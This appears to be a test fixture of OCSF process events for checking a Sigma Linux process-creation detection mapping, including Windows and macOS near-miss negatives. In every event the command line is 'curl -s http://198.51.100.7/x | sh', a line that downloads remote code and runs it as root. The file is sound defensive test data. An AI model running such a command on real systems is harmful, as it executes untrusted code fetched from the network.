@@ -1,0 +1,41 @@
+// OCSF Process Activity (1007) fixture events for the `sigma/linux/process_creation`
+// mapping family. Commented events are near-miss negatives.
+{
+  id: "match",
+  time: 2024-05-01T12:00:00Z,
+  class_uid: 1007,
+  activity_id: 1,
+  metadata: {version: "1.9.0", profiles: ["host"], event_code: "1", log_name: "Linux-Sysmon/Operational", product: {name: "Microsoft-Windows-Sysmon"}},
+  device: {hostname: "srv01", os: {type_id: 200, name: "Linux"}},
+  process: {pid: 4242, path: "/usr/bin/curl", cmd_line: "curl -s http://198.51.100.7/x | sh", file: {path: "/usr/bin/curl", type_id: 8}, user: {name: "root"}, working_directory: "/tmp", parent_process: {path: "/bin/bash", cmd_line: "/bin/bash", file: {path: "/bin/bash"}}},
+}
+// Also matches: unknown OS stays eligible.
+{
+  id: "unknown-os",
+  time: 2024-05-01T12:00:01Z,
+  class_uid: 1007,
+  activity_id: 1,
+  metadata: {version: "1.9.0", profiles: ["host"], event_code: "1", log_name: "Linux-Sysmon/Operational", product: {name: "Microsoft-Windows-Sysmon"}},
+  device: {hostname: "srv01"},
+  process: {pid: 4242, path: "/usr/bin/curl", cmd_line: "curl -s http://198.51.100.7/x | sh", file: {path: "/usr/bin/curl", type_id: 8}, user: {name: "root"}, working_directory: "/tmp", parent_process: {path: "/bin/bash", cmd_line: "/bin/bash", file: {path: "/bin/bash"}}},
+}
+// Guard must reject: a Windows host contradicts a Linux logsource.
+{
+  id: "windows",
+  time: 2024-05-01T12:00:02Z,
+  class_uid: 1007,
+  activity_id: 1,
+  metadata: {version: "1.9.0", profiles: ["host"], event_code: "1", log_name: "Linux-Sysmon/Operational", product: {name: "Microsoft-Windows-Sysmon"}},
+  device: {hostname: "srv01", os: {type_id: 100, name: "Windows"}},
+  process: {pid: 4242, path: "/usr/bin/curl", cmd_line: "curl -s http://198.51.100.7/x | sh", file: {path: "/usr/bin/curl", type_id: 8}, user: {name: "root"}, working_directory: "/tmp", parent_process: {path: "/bin/bash", cmd_line: "/bin/bash", file: {path: "/bin/bash"}}},
+}
+// Guard must reject: a macOS host contradicts a Linux logsource.
+{
+  id: "macos",
+  time: 2024-05-01T12:00:03Z,
+  class_uid: 1007,
+  activity_id: 1,
+  metadata: {version: "1.9.0", profiles: ["host"], event_code: "1", log_name: "Linux-Sysmon/Operational", product: {name: "Microsoft-Windows-Sysmon"}},
+  device: {hostname: "srv01", os: {type_id: 300, name: "macOS"}},
+  process: {pid: 4242, path: "/usr/bin/curl", cmd_line: "curl -s http://198.51.100.7/x | sh", file: {path: "/usr/bin/curl", type_id: 8}, user: {name: "root"}, working_directory: "/tmp", parent_process: {path: "/bin/bash", cmd_line: "/bin/bash", file: {path: "/bin/bash"}}},
+}
